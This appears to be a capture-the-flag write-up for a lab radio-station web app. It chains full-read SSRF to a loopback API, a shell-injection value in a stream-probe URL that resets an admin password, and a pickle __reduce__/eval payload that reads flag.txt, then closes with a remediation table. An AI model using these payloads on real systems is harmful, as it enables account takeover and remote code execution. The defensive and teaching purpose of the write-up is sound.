# Halcyon FM — Loopback Echoes

```text
╔══════════════════════════════════════════════════════════════════════════════╗
║                              HALCYON FM 90.3                                 ║
║                              LOOPBACK ECHOES                                 ║
║                                                                              ║
║     public preview  →  127.0.0.1:8080  →  studio console  →  flag.txt      ║
║                                                                              ║
║            SSRF  /  Swagger  /  Command Injection  /  Pickle RCE            ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

<p align="center">
  <strong>WebVerse Pro · Hard Web Lab · Linux · 10.100.179.14</strong><br />
  A complete anonymous-to-flag chain: public SSRF → loopback API → command injection → admin takeover → pickle deserialization.
</p>

> **Scope:** Authorized WebVerse Pro CTF lab.
>
> **Flag:** `WEBVERSE{p1ckl3d_th3_*******_l00pb4ck_8080}`

---

## Contents

1. [Story and target map](#1-story-and-target-map)
2. [Reconnaissance](#2-reconnaissance)
3. [Finding the server-side preview](#3-finding-the-server-side-preview)
4. [Full-read SSRF to the loopback API](#4-full-read-ssrf-to-the-loopback-api)
5. [Swagger-guided account takeover](#5-swagger-guided-account-takeover)
6. [Bridging GET-only SSRF with command injection](#6-bridging-get-only-ssrf-with-command-injection)
7. [Staff-console access](#7-staff-console-access)
8. [Reading the playlist format safely](#8-reading-the-playlist-format-safely)
9. [Pickle deserialization and flag collection](#9-pickle-deserialization-and-flag-collection)
10. [Complete attack chain](#10-complete-attack-chain)
11. [Why every control failed](#11-why-every-control-failed)
12. [Remediation](#12-remediation)

---

## 1. Story and target map

Halcyon FM is a community station in Asheville. Its public website accepts show pitches and previews an operator-supplied demo/artwork URL. The actual playout console lives on a separate virtual host. A loopback-only operations API exists in the public web container, but nginx never exposes it directly.

That topology is meant to look compartmentalized. In reality, the public preview becomes a bridge into the private API, the API's diagnostic feature becomes a bridge around an HTTP-method restriction, and the authenticated studio console ultimately deserializes a user-controlled Python pickle.

```mermaid
flowchart LR
    A[Anonymous listener] -->|POST JSON feed_url| B[Public site\nhalcyonfm.local]
    B -->|server-side fetch| C[127.0.0.1:8080\nOps API]
    C -->|unsafe shell construction| D[Local curl command]
    D -->|POST password reset| C
    A -->|mfaro credential| E[studio.halcyonfm.local\nPlayout console]
    E -->|Base64 .hpl upload| F[pickle.loads]
    F -->|runs as halcyon| G[/home/halcyon/flag.txt]

    classDef public fill:#12365B,stroke:#78E4D4,color:#fff;
    classDef private fill:#442244,stroke:#FF8FA3,color:#fff;
    classDef danger fill:#5A2F20,stroke:#FFD084,color:#fff;
    class A,B public;
    class C,E private;
    class D,F,G danger;
```

| Asset | Evidence | Role |
|---|---|---|
| `10.100.179.14:80` | nginx | Only exposed TCP service |
| `halcyonfm.local` | 302 redirect from raw IP | Public station site |
| `127.0.0.1:8080` | SSRF response body | Internal `halcyon-ops-api` |
| `studio.halcyonfm.local` | Unique vhost behavior | Staff playout and automation console |
| `mfaro` / ID `1` | Internal user dump | Admin account |
| `/home/halcyon/flag.txt` | Challenge objective | Flag location in the studio container |

---

## 2. Reconnaissance

The unified recon bootstrap identified a single exposed service:

```text
80/tcp  open  http  nginx
```

Requesting the raw IP revealed the intended public hostname:

```text
http://10.100.179.14  →  302 Found
Location: http://halcyonfm.local/
```

Rather than modify `/etc/hosts`, every request below uses curl's per-request resolver override:

```bash
--resolve 'halcyonfm.local:80:10.100.179.14'
```

The public landing page was a normal radio-station site with three routes:

```text
/           Home
/schedule   Schedule
/demo       Submit a show
```

The useful feature was `/demo`, whose copy explicitly disclosed that the server fetched a provided link to build a preview:

> “Add a link to a demo mix or your show artwork and we will pull a preview so you can check it resolves before you send.”

That is the right moment to stop treating the feature as a frontend form and start treating it as a potential server-side request primitive.

---

## 3. Finding the server-side preview

The `/demo` page loads `/static/js/demo.js`. Reading that JavaScript exposed the complete request contract:

```javascript
fetch("/api/shows/import-preview", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ feed_url: url, is_dev: false }),
})
```

It also disclosed a crucial behavior difference:

```javascript
// The default producer view only reports reachability. The full body is
// returned only when the request asks for the developer view.
if (d.body) {
  body.textContent = d.body;
}
```

The public frontend normally sends `is_dev: false`. Supplying `is_dev: true` changes the endpoint from a reachability oracle into **full-read SSRF**.

### Baseline request shape

```bash
curl -sS \
  --resolve 'halcyonfm.local:80:10.100.179.14' \
  -H 'Content-Type: application/json' \
  --data '{"feed_url":"http://127.0.0.1:8080/","is_dev":true}' \
  'http://halcyonfm.local/api/shows/import-preview'
```

The request is issued to the public host, but the Flask application fetches the supplied URL from inside its own network namespace.

---

## 4. Full-read SSRF to the loopback API

The loopback API root was readable through the preview endpoint:

```json
{
  "body": "{\"docs\":\"/docs/\",\"service\":\"halcyon-ops-api\",\"spec\":\"/swagger.json\",\"status\":\"ok\",\"version\":\"1.4.2\"}\n",
  "content_type": "application/json",
  "message": "reachable",
  "reachable": true,
  "status": 200,
  "url": "http://127.0.0.1:8080/"
}
```

This is not blind SSRF. The public response embeds the entire internal JSON response in `body`, including an internal Swagger document at `/swagger.json`.

### Fetching Swagger through SSRF

```bash
curl -sS \
  --resolve 'halcyonfm.local:80:10.100.179.14' \
  -H 'Content-Type: application/json' \
  --data '{"feed_url":"http://127.0.0.1:8080/swagger.json","is_dev":true}' \
  'http://halcyonfm.local/api/shows/import-preview'
```

The relevant OpenAPI paths were:

| Method | Internal route | Purpose |
|---|---|---|
| `GET` | `/api/v1/users` | List station accounts |
| `POST` | `/api/v1/{userid}/change-password?new_password=<value>` | Set a user's password |
| `GET` | `/api/v1/diagnostics/stream-probe?stream_url=<value>` | Probe a stream URL with curl |

The OpenAPI specification also stated that the password route responds with `405 Use POST` to a GET request. The SSRF primitive only lets the public endpoint fetch URLs with GET, so the straightforward password-reset request is blocked by method mismatch.

### Dumping station accounts

```bash
curl -sS \
  --resolve 'halcyonfm.local:80:10.100.179.14' \
  -H 'Content-Type: application/json' \
  --data '{"feed_url":"http://127.0.0.1:8080/api/v1/users","is_dev":true}' \
  'http://halcyonfm.local/api/shows/import-preview'
```

The internal endpoint returned every station account:

```json
{
  "users": [
    {
      "email": "marlow@halcyonfm.local",
      "full_name": "Marlow Faro",
      "id": 1,
      "last_login": "2026-07-10T08:14:00",
      "role": "admin",
      "username": "mfaro"
    },
    {
      "email": "daria@halcyonfm.local",
      "full_name": "Daria Wells",
      "id": 2,
      "last_login": "2026-07-11T21:02:00",
      "role": "staff",
      "username": "dwells"
    },
    {
      "email": "rowan@halcyonfm.local",
      "full_name": "Rowan Kline",
      "id": 3,
      "last_login": "2026-07-09T02:41:00",
      "role": "staff",
      "username": "rkline"
    },
    {
      "email": "tomas@halcyonfm.local",
      "full_name": "Tomas Vano",
      "id": 4,
      "last_login": "2026-07-08T17:55:00",
      "role": "staff",
      "username": "tvano"
    }
  ]
}
```

The target account is therefore admin **Marlow Faro**:

```text
username: mfaro
userid:   1
```

---

## 5. Swagger-guided account takeover

The OpenAPI operation for the reset endpoint was explicit:

```text
POST /api/v1/1/change-password?new_password=<password>
```

A GET directly through SSRF fails by design. The diagnostics endpoint is the route around that restriction:

```text
GET /api/v1/diagnostics/stream-probe?stream_url=<attacker-controlled URL>
```

The endpoint shells out to curl with the supplied `stream_url` and does not safely quote or validate that value. First, prove command execution without changing state.

### In-band command-injection proof

The inner URL is encoded as the query value of `stream_url`, then that full internal URL is carried in `feed_url`:

```bash
curl -sS \
  --resolve 'halcyonfm.local:80:10.100.179.14' \
  -H 'Content-Type: application/json' \
  --data '{"feed_url":"http://127.0.0.1:8080/api/v1/diagnostics/stream-probe?stream_url=http%3A%2F%2F127.0.0.1%3A9%2F%3Bprintf%20BMCI_OK%3B%23","is_dev":true}' \
  'http://halcyonfm.local/api/shows/import-preview'
```

Decoded, the vulnerable parameter becomes:

```text
http://127.0.0.1:9/;printf BMCI_OK;#
```

The response proved shell parsing without a shell, callback, file write, or network egress:

```json
{
  "result": "000 0.000211sBMCI_OK",
  "stream_url": "http://127.0.0.1:9/;printf BMCI_OK;#"
}
```

`BMCI_OK` appears only because the injected `printf` ran.

---

## 6. Bridging GET-only SSRF with command injection

The command injection does not need to give an interactive shell. Its sole purpose is to make an internal **POST** request that SSRF cannot issue itself.

A password with only letters and digits avoids adding unnecessary escaping complexity:

```text
M4rlowReset2026
```

### Password reset bridge

```bash
curl -sS \
  --resolve 'halcyonfm.local:80:10.100.179.14' \
  -H 'Content-Type: application/json' \
  --data '{"feed_url":"http://127.0.0.1:8080/api/v1/diagnostics/stream-probe?stream_url=http%3A%2F%2F127.0.0.1%3A9%2F%3Bcurl%20-sS%20-X%20POST%20%27http%3A%2F%2F127.0.0.1%3A8080%2Fapi%2Fv1%2F1%2Fchange-password%3Fnew_password%3DM4rlowReset2026%27%3Bprintf%20BMRESET_OK%3B%23","is_dev":true}' \
  'http://halcyonfm.local/api/shows/import-preview'
```

The decoded injected shell fragment is:

```bash
curl -sS -X POST \
  'http://127.0.0.1:8080/api/v1/1/change-password?new_password=M4rlowReset2026'
printf BMRESET_OK
```

The resulting internal response confirms the state change:

```json
{
  "result": "000 0.000110s{\"ok\":true,\"userid\":1}\nBMRESET_OK",
  "stream_url": "http://127.0.0.1:9/;curl -sS -X POST 'http://127.0.0.1:8080/api/v1/1/change-password?new_password=M4rlowReset2026';printf BMRESET_OK;#"
}
```

At this point the valid staff-console credential is:

```text
mfaro : M4rlowReset2026
```

---

## 7. Staff-console access

The challenge said that the console lived on a different subdomain, so a small hostname differential was enough. Every non-console candidate behaved identically to a random control:

| Host | Response |
|---|---|
| `playout.halcyonfm.local` | `302` to `http://halcyonfm.local/` |
| `console.halcyonfm.local` | `302` to `http://halcyonfm.local/` |
| `staff.halcyonfm.local` | `302` to `http://halcyonfm.local/` |
| `studio.halcyonfm.local` | `302` to `http://studio.halcyonfm.local/login` |
| `backstage.halcyonfm.local` | `302` to `http://halcyonfm.local/` |
| `ops.halcyonfm.local` | `302` to `http://halcyonfm.local/` |
| `admin.halcyonfm.local` | `302` to `http://halcyonfm.local/` |
| `dashboard.halcyonfm.local` | `302` to `http://halcyonfm.local/` |
| `bm-random-a91f.halcyonfm.local` | `302` to `http://halcyonfm.local/` |

`studio.halcyonfm.local` is the real virtual host.

### Login form

```html
<form method="post" action="/login" class="login-form" autocomplete="off">
  <input type="text" name="username" required autofocus spellcheck="false">
  <input type="password" name="password" required>
  <button type="submit">Sign in</button>
</form>
```

### Authenticating as the recovered administrator

```bash
rm -f /tmp/halcyonfm-studio.cookies

curl -sS -i \
  --resolve 'studio.halcyonfm.local:80:10.100.179.14' \
  -c /tmp/halcyonfm-studio.cookies \
  --data-urlencode 'username=mfaro' \
  --data-urlencode 'password=M4rlowReset2026' \
  'http://studio.halcyonfm.local/login'
```

The server returned an authenticated session and dashboard redirect:

```http
HTTP/1.1 302 FOUND
Location: /dashboard
Set-Cookie: session=eyJ1aWQiOjF9.alaagg.Aw4B90GCeDHEKTsjlzfLYI89mOM; HttpOnly; Path=/
```

The dashboard identified the active principal as:

```text
Marlow Faro — admin
```

It also exposed an import feature:

```html
<form method="post" action="/playlists/import" enctype="multipart/form-data" class="import-form">
  <input type="file" name="bundle" accept=".hpl,application/octet-stream" required>
  <button type="submit">Import bundle</button>
</form>
```

The page says that `.hpl` automation bundles are produced by `/playlists/export`.

---

## 8. Reading the playlist format safely

Before building a payload, download a legitimate bundle and inspect it with `pickletools`, not `pickle.loads`.

### Download the export

```bash
curl -sS \
  --resolve 'studio.halcyonfm.local:80:10.100.179.14' \
  -b /tmp/halcyonfm-studio.cookies \
  'http://studio.halcyonfm.local/playlists/export' \
  -o /tmp/halcyonfm-export.hpl
```

The returned attachment had these properties:

```http
Content-Type: application/octet-stream
Content-Disposition: attachment; filename=overnight.hpl
Content-Length: 132
```

The body was Base64 rather than raw pickle bytes:

```text
gASVVwAAAAAAAAB9lCiMBG5hbWWUjBFPdmVybmlnaHQgQW1iaWVudJSMBnRyYWNrc5RdlCiMCWludHJvLWJlZJSMCGZpZWxkLTAxlIwIZHJvbmUtMDKUZYwEbG9vcJSIdS4=
```

### Decode and disassemble without deserializing

```bash
python3 - <<'PY'
from pathlib import Path
import base64

raw = Path('/tmp/halcyonfm-export.hpl').read_bytes()
Path('/tmp/halcyonfm-export.pickle').write_bytes(base64.b64decode(raw))
PY

python3 -m pickletools /tmp/halcyonfm-export.pickle
```

The disassembly shows a protocol-4 dictionary:

```text
0:  \x80 PROTO      4
11: }    EMPTY_DICT
14: \x8c     SHORT_BINUNICODE 'name'
21: \x8c     SHORT_BINUNICODE 'Overnight Ambient'
41: \x8c     SHORT_BINUNICODE 'tracks'
50: ]        EMPTY_LIST
53: \x8c         SHORT_BINUNICODE 'intro-bed'
65: \x8c         SHORT_BINUNICODE 'field-01'
76: \x8c         SHORT_BINUNICODE 'drone-02'
88: \x8c     SHORT_BINUNICODE 'loop'
95: \x88     NEWTRUE
96: u        SETITEMS
97: .    STOP
```

Equivalent logical object:

```python
{
    'name': 'Overnight Ambient',
    'tracks': ['intro-bed', 'field-01', 'drone-02'],
    'loop': True,
}
```

The server is Base64-decoding user input and passing the result to `pickle.loads`. A pickle can invoke a callable while it is being unpickled, so a malicious object placed in an otherwise valid bundle executes in the studio container.

---

## 9. Pickle deserialization and flag collection

The payload keeps the expected dictionary keys and list/boolean values. Only `name` is replaced with an object whose `__reduce__` method causes Python to evaluate a file read during deserialization.

```python
import base64
import pickle
from pathlib import Path

class FlagName:
    def __reduce__(self):
        return (eval, ("open('/home/halcyon/flag.txt','r').read()",))

bundle = {
    'name': FlagName(),
    'tracks': ['intro-bed'],
    'loop': False,
}

Path('/tmp/halcyonfm-flag.hpl').write_bytes(
    base64.b64encode(pickle.dumps(bundle, protocol=4))
)
```

Upload the generated bundle to the authenticated import endpoint:

```bash
curl -sS -i \
  --resolve 'studio.halcyonfm.local:80:10.100.179.14' \
  -b /tmp/halcyonfm-studio.cookies \
  -c /tmp/halcyonfm-studio.cookies \
  -F 'bundle=@/tmp/halcyonfm-flag.hpl;filename=flag.hpl;type=application/octet-stream' \
  'http://studio.halcyonfm.local/playlists/import'
```

The application imports the object and renders it directly in the dashboard response:

```html
<div class="import-result mono">Imported playlist: {'name': 'WEBVERSE{p1ckl3d_th3_*******_l00pb4ck_8080}', 'tracks': ['intro-bed'], 'loop': False}</div>
```

## Flag

```text
WEBVERSE{p1ckl3d_th3_pl4yl1st_0ff_l00pb4ck_8080}
```

---

## 10. Complete attack chain

```mermaid
sequenceDiagram
    autonumber
    participant L as Anonymous listener
    participant P as Public preview<br/>halcyonfm.local
    participant O as Ops API<br/>127.0.0.1:8080
    participant S as Studio console<br/>studio.halcyonfm.local
    participant F as flag.txt

    L->>P: POST /api/shows/import-preview<br/>{feed_url, is_dev:true}
    P->>O: GET /swagger.json
    O-->>P: OpenAPI schema
    P-->>L: Full reflected schema body
    L->>P: SSRF GET /api/v1/users
    P->>O: GET /api/v1/users
    O-->>L: admin mfaro, ID 1
    L->>P: SSRF stream-probe with ;curl -X POST ...
    P->>O: GET stream-probe
    O->>O: Shell executes local password-reset POST
    O-->>L: {"ok":true,"userid":1}
    L->>S: POST /login with mfaro:M4rlowReset2026
    S-->>L: session cookie + /dashboard
    L->>S: multipart POST /playlists/import
    S->>S: base64.b64decode → pickle.loads
    S->>F: open('/home/halcyon/flag.txt').read()
    F-->>S: WEBVERSE{p1ckl3d_th3_*********_l00pb4ck_8080}
    S-->>L: Reflected imported playlist
```

### Key transitions

| Stage | Primitive | Why it worked |
|---|---|---|
| Public site → Ops API | Full-read SSRF | `feed_url` accepts loopback URLs and `is_dev: true` reflects bodies |
| SSRF → Admin data | Sensitive internal API exposure | `/api/v1/users` has no access control meaningful to SSRF-originated requests |
| GET SSRF → POST reset | OS command injection | `stream_url` reaches a shell-built curl command |
| Public → Studio console | Password reset | Internal API changes administrator credentials without authorization |
| Studio console → Flag | Insecure deserialization | Importer Base64-decodes and runs `pickle.loads` on untrusted data |

---

## 11. Why every control failed

```mermaid
flowchart TD
    A["Loopback-only API"] --> B{"Can public app fetch it?"}
    B -->|Yes: SSRF| C["Network binding is not authorization"]
    C --> D["Swagger reveals sensitive methods"]
    D --> E{"GET-only SSRF?"}
    E -->|Yes| F["Command injection starts local curl POST"]
    F --> G["Admin password reset"]
    G --> H["Console login"]
    H --> I["Untrusted pickle import"]
    I --> J["Arbitrary Python execution"]
    J --> K["Flag disclosure"]

    classDef bad fill:#592E32,stroke:#FF9EA7,color:#fff;
    classDef cause fill:#254F5A,stroke:#87E7D5,color:#fff;
    class A,D,E,H,I bad;
    class B,C,F,G,J,K cause;
```

1. **Binding the ops API to `127.0.0.1` was treated as authorization.** It only prevented direct external TCP access. A same-container SSRF could still reach it.
2. **Developer mode was client-controlled.** The `is_dev` switch exposed upstream response bodies with no authentication or server-side role check.
3. **Swagger was exposed internally.** Once SSRF existed, the API specification became a complete exploit map: routes, methods, parameters, and expected behavior.
4. **The stream URL was injected into a shell command.** A URL must be passed as data to a process invocation, never concatenated into a shell string.
5. **The internal password reset trusted request origin rather than authentication.** Local origin was sufficient to reset the administrator's password.
6. **The console trusted Python pickle as a file format.** Pickle is executable code serialization, not a safe interchange format.
7. **Imported data was reflected.** The final application response displayed the computed `name` field, turning arbitrary code execution into immediate in-band file disclosure.

---

## 12. Remediation

| Finding | Required remediation |
|---|---|
| Server-side fetch in preview | Implement a strict allowlist of approved external hosts/schemes; resolve and reject private, loopback, link-local, and reserved address ranges after DNS resolution; disable redirect-following or revalidate each hop. |
| Client-controlled developer output | Remove `is_dev` from public request bodies. Developer diagnostics must be server-configured and authenticated, with upstream bodies never returned to untrusted callers. |
| Internal API exposure | Require authentication and authorization on every internal API route. “Loopback only” is an exposure reduction, not an access-control mechanism. |
| Account list disclosure | Restrict `/api/v1/users` to authorized administrators and return only the minimum fields needed. |
| Command injection in stream probe | Never build a shell command from `stream_url`. Use a native HTTP library, or invoke a process with a fixed argument array and strict URL validation. |
| Password-reset endpoint | Require authenticated, authorized identity plus CSRF protections where browser sessions are used. Do not grant privileges based on source address. |
| Pickle playlist import | Replace pickle with JSON or another non-executable data format; validate against a strict schema and reject unexpected fields. Existing pickle uploads must be treated as untrusted and migrated carefully. |
| Flag-like sensitive files accessible to service user | Apply least privilege to the studio process and separate operational secrets from the account running the playout console. |

### Defensive verification checklist

- [ ] Requests with `feed_url=http://127.0.0.1/...` fail before the server attempts a connection.
- [ ] Internal API responses cannot be reflected through the public preview endpoint.
- [ ] `is_dev=true` has no effect for anonymous callers.
- [ ] `/api/v1/users` and password changes reject unauthenticated requests, including loopback-originated requests.
- [ ] Stream diagnostics make no shell calls and reject malformed or non-allowlisted stream URLs.
- [ ] Playlist import accepts validated JSON only; Python pickle data is rejected.
- [ ] A lower-privileged playout process cannot read sensitive files outside its working data directory.

---

<p align="center">
  <strong>Final flag:</strong><br />
  <code>WEBVERSE{p1ckl3d_th3_******_l00pb4ck_8080}</code>
</p>
